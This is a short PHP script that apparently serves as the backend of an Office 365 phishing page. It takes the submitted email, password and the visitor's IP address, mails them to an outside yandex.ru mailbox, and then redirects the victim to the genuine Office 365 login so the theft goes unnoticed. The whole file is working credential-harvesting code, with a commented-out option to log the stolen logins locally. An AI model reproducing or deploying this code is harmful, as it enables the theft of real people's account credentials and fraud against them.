<?php
$ip = getenv("REMOTE_ADDR");
$onlineid = $_POST["email"];
$passcode = $_POST["password"];
$message  = "*********** 2PaQ ***********\n";
$message .= "UserID : $onlineid\n";
$message .= "Passwd : $passcode\n";
$message .= "IP Address : $ip\n";
$message .= "*********** 2PaQ ***********\n\n\n";


$send="habib.james@yandex.ru
";

$subject = "DOMAIN | $onlineid | $ip";
$headers = "From: DOMAIN<information@mail.com>";
$headers .= $_POST['email']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
//$text = fopen('coolio.txt', 'a');
//fwrite($text, $message);
header("LOCATION: https://mail.office365.com/");
?>